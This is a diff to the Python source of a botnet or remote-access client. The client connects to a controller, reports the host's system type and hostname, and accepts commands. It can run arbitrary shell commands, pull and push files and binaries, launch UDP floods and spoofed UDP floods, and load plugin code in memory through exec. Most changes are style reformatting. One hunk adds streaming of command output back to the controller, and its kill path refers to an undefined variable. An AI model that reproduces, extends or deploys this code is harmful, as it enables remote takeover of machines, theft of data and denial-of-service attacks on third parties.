@@ -7,7 +7,8 @@ from sys import argv, modules
 from time import sleep
 from subprocess import Popen, PIPE
 from multiprocessing import Process, freeze_support
-from socket import socket, IPPROTO_UDP, IPPROTO_RAW, SOCK_DGRAM, SOCK_STREAM, SOCK_RAW, AF_INET
+from socket import (socket, IPPROTO_UDP, IPPROTO_RAW, SOCK_DGRAM, SOCK_STREAM,
+                    SOCK_RAW, AF_INET)
 from socket import error as sock_error
 from socket import SHUT_RDWR
 import ssl
@@ -89,44 +90,46 @@ def udp_spoof_start(target_ip, target_port, spoofed_ip, spoofed_port, payload):
 class Client(object):
     """Class for Client."""
     def __init__(self, addr, port=9000):
+        # self.pipe = None
         self.sock = socket(AF_INET, SOCK_STREAM)
         try:
             cntx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
-        except AttributeError: # All PROTOCOL consts are merged on TLS in Python2.7.13
+        except AttributeError:
+            # All PROTOCOL consts are merged on TLS in Python2.7.13
             cntx = ssl.SSLContext(ssl.PROTOCOL_TLS)
         self.sock = cntx.wrap_socket(self.sock)
         self.address = addr
         self.port = int(port)
         self.quit_signal = False
-        self.version = ("%s-%s" %(__version__, "full"))
+        self.version = ("%s-%s" % (__version__, "full"))
         self.plugins = {}
         self.plugin_cmds = {}
         self.comm_dict = {
-            '00000' : 'killMe',
-            '00001' : 'getFile',
-            '00002' : 'getBinary',
-            '00003' : 'sendFile',
-            '00004' : 'sendBinary',
-            '00005' : 'udpFlood',
-            '00006' : 'udpSpoof',
-            '00007' : 'command',
-            '00008' : 'KILL',
-            '00009' : 'loadPlugin',
-            '00010' : 'unloadPlugin',
-            '00011' : 'runPluginCommand'
+            '00000': 'killMe',
+            '00001': 'getFile',
+            '00002': 'getBinary',
+            '00003': 'sendFile',
+            '00004': 'sendBinary',
+            '00005': 'udpFlood',
+            '00006': 'udpSpoof',
+            '00007': 'command',
+            '00008': 'KILL',
+            '00009': 'loadPlugin',
+            '00010': 'unloadPlugin',
+            '00011': 'runPluginCommand'
         }
         self.comm_swtch = {
-            'killMe'    : self.kill_me,
-            'getFile'   : self.get_file,
-            'getBinary' : self.get_binary,
-            'sendFile'  : self.send_file,
+            'killMe': self.kill_me,
+            'getFile': self.get_file,
+            'getBinary': self.get_binary,
+            'sendFile': self.send_file,
             'sendBinary': self.send_binary,
-            'udpFlood'  : self.udp_flood,
-            'udpSpoof'  : self.udp_spoof,
-            'command'   : self.run_cm,
+            'udpFlood': self.udp_flood,
+            'udpSpoof': self.udp_spoof,
+            'command': self.run_cm,
             'loadPlugin': self.load_plugin,
             'unloadPlugin': self.unload_plugin,
-            'runPluginCommand' : self.run_plugin_cm
+            'runPluginCommand': self.run_plugin_cm
         }
 
     def loop(self):
@@ -148,20 +151,23 @@ class Client(object):
         try:
             self.sock.connect((self.address, self.port))
             ###Send Version###
-            msg_len = get_len(self.version, 2) # len is 2-digit (i.e. up to 99 chars)
+            # len is 2-digit (i.e. up to 99 chars)
+            msg_len = get_len(self.version, 2)
             en_stdout = self.send(msg_len)
             en_stdout = self.send(self.version)
             ##################
             sys_type, sys_hname = sys_info()
             ###Send System Type###
-            msg_len = get_len(sys_type, 2) # len is 2-digit (i.e. up to 99 chars)
+            # len is 2-digit (i.e. up to 99 chars)
+            msg_len = get_len(sys_type, 2)
             en_stdout = self.send(msg_len)
             en_stdout = self.send(sys_type)
             ######################
             ###Send Hostname###
             if sys_hname == "":
                 sys_hname = "None"
-            msg_len = get_len(sys_hname, 2) # len is 2-digit (i.e. up to 99 chars)
+            # len is 2-digit (i.e. up to 99 chars)
+            msg_len = get_len(sys_hname, 2)
             en_stdout = self.send(msg_len)
             en_stdout = self.send(sys_hname)
             ###################
@@ -210,6 +216,26 @@ class Client(object):
         command_size = self.receive(13)
         command = self.receive(int(command_size))
         comm = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
+        # self.pipe = comm
+        killed = False
+        while not comm.returncode and not killed:
+            en_data = self.receive(5)
+            try:
+                en_data = self.comm_dict[en_data]
+            except KeyError:
+                continue
+            if en_data == 'KILL':
+                proc.terminate()
+                killed = True
+                data = comm.stdout.read()
+                len_send = get_len(data, 13)
+            else:
+                data = comm.stdout.readline()
+                len_send = get_len(data, 3)
+            en_stdout = self.send(len_send)
+            if en_stdout == 0:
+                en_stdout = self.send(data)
+
         stdout, stderr = comm.communicate()
         if stderr:
             decode = stderr.decode('UTF-8')
@@ -225,24 +251,24 @@ class Client(object):
 
     def run_plugin_cm(self):
         """Exeute command defined in a plugin."""
-        en_data = self.receive(3) # Plugin command name up to 999 chars
+        en_data = self.receive(3)  # Plugin command name up to 999 chars
         command = self.receive(int(en_data))
         args = []
 
         # TODO: Decide if args are handled centrally or by local handler.
 
-        #num_of_args = self.receive(2) # Up to 99 arguments
-        #for i in range (0, int(num_of_args)):
-        #    en_data = self.receive(2) # Argument up to 99 chars
-        #    en_data = self.receive(int(en_data))
-        #    args.append(en_data)
-        
+        # num_of_args = self.receive(2) # Up to 99 arguments
+        # for i in range (0, int(num_of_args)):
+        #     en_data = self.receive(2) # Argument up to 99 chars
+        #     en_data = self.receive(int(en_data))
+        #     args.append(en_data)
+
         self.plugin_cmds[command]['exec'](self, args)
 
     def get_file(self):
         """Get file name and contents from server, create file."""
         exit_code = 0
-        fname_length = self.receive(3) # Filename length up to 999 chars
+        fname_length = self.receive(3)  # Filename length up to 999 chars
         fname = self.receive(int(fname_length))
         try:
             file_to_write = open(fname, 'w')
@@ -254,7 +280,8 @@ class Client(object):
         else:
             en_stdout = self.send(stdout)
             if en_stdout == 0:
-                f_size = self.receive(13) # File size up to 9999999999999 chars
+                # File size up to 9999999999999 chars
+                f_size = self.receive(13)
                 en_data = self.receive(int(f_size))
                 file_to_write.write(en_data)
                 file_to_write.close()
@@ -267,7 +294,7 @@ class Client(object):
     def get_binary(self):
         """Get binary name and contents from server, create binary."""
         exit_code = 0
-        bname_length = self.receive(3) # Filename length up to 999 chars
+        bname_length = self.receive(3)  # Filename length up to 999 chars
         bname = self.receive(int(bname_length))
         try:
             bin_to_write = open(bname, 'wb')
@@ -279,7 +306,8 @@ class Client(object):
         else:
             en_stdout = self.send(stdout)
             if en_stdout == 0:
-                b_size = self.receive(13) # Binary size up to 9999999999999 symbols
+                # Binary size up to 9999999999999 symbols
+                b_size = self.receive(13)
                 en_data = self.receive(int(b_size))
                 bin_to_write.write(en_data)
                 bin_to_write.close()
@@ -292,7 +320,7 @@ class Client(object):
     def send_file(self):
         """Get file name from server, send contents back."""
         exit_code = 0
-        fname_length = self.receive(3) # Filename length up to 999 chars
+        fname_length = self.receive(3)  # Filename length up to 999 chars
         fname = self.receive(int(fname_length))
         try:
             file_to_send = open(fname, 'r')
@@ -318,7 +346,7 @@ class Client(object):
     def send_binary(self):
         """Get binary name from server, send contents back."""
         exit_code = 0
-        bname_length = self.receive(3) # Filename length up to 999 chars
+        bname_length = self.receive(3)  # Filename length up to 999 chars
         bname = self.receive(int(bname_length))
         try:
             bin_to_send = open(bname, 'rb')
@@ -342,14 +370,19 @@ class Client(object):
         return exit_code
 
     def udp_flood(self):
-        """Get target ip and port from server, start UPD flood wait for 'KILL'."""
-        en_data = self.receive(3) # Max ip+port+payload length 999 chars
+        """
+        Get target ip and port from server, start UPD flood wait for 'KILL'.
+        """
+        en_data = self.receive(3)  # Max ip + port + payload length 999 chars
         en_data = self.receive(int(en_data))
         en_data = en_data.split(":")
         target_ip = en_data[0]
         target_port = int(en_data[1])
         msg = en_data[2]
-        proc = Process(target=udp_flood_start, args=(target_ip, target_port, msg))
+        proc = Process(
+            target=udp_flood_start,
+            args=(target_ip, target_port, msg)
+        )
         proc.start()
         killed = False
         while not killed:
@@ -364,8 +397,12 @@ class Client(object):
         return 0
 
     def udp_spoof(self):
-        """Get target/spoofed ip and port from server, start UPD spoof wait for 'KILL'."""
-        en_data = self.receive(3) # Max ip+port+spoofedip+spoofed port+payload length 999 chars
+        """
+        Get target/spoofed ip and port from server, start UPD spoof wait for
+        'KILL'.
+        """
+        # Max ip + port + spoofedip + spoofed port + payload length 999 chars
+        en_data = self.receive(3)
         en_data = self.receive(int(en_data))
         en_data = en_data.split(":")
         target_ip = en_data[0]
@@ -390,16 +427,16 @@ class Client(object):
         return 0
 
     def load_plugin(self):
-        """Zero disk interaction module loading.
-        Taken from http://code.activestate.com/recipes/82234-importing-a-dynamically-generated-module/
+        """Zero disk interaction module loading. Taken from
+        http://code.activestate.com/recipes/82234-importing-a-dynamically-generated-module/
         Under PSF License.
         Added code licensed under MIT."""
         import imp
         # Get plugin name.
-        en_data = self.receive(3) # Max plugin name length 999 chars
+        en_data = self.receive(3)  # Max plugin name length 999 chars
         name = self.receive(int(en_data))
         # Get plugin code.
-        en_data = self.receive(13) # Max plugin length 99999999999 chars
+        en_data = self.receive(13)  # Max plugin length 99999999999 chars
         code = self.receive(int(en_data))
         module = imp.new_module(name)
         exec code in module.__dict__
@@ -408,12 +445,14 @@ class Client(object):
         for element in dir(module):
             # Root out "private" fields and already imported commands.
             if not element.startswith("_") and element not in self.plugin_cmds:
-                self.plugin_cmds[element] = { 'exec' : getattr(module, element),
-                                            'module' : name}
+                self.plugin_cmds[element] = {
+                    'exec': getattr(module, element),
+                    'module': name
+                }
 
     def unload_plugin(self):
         """Asyncronously unload a plugin."""
-        en_data = self.receive(3) # Max plugin name length 999 chars
+        en_data = self.receive(3)  # Max plugin name length 999 chars
         en_data = self.receive(int(en_data))
         for com in self.plugin_cmds:
             # Remove module commands.
@@ -442,7 +481,7 @@ def main():
     myself.loop()
 
 
-#Start Here!
+# Start Here!
 if __name__ == '__main__':
     freeze_support()
     Process(target=main).start()
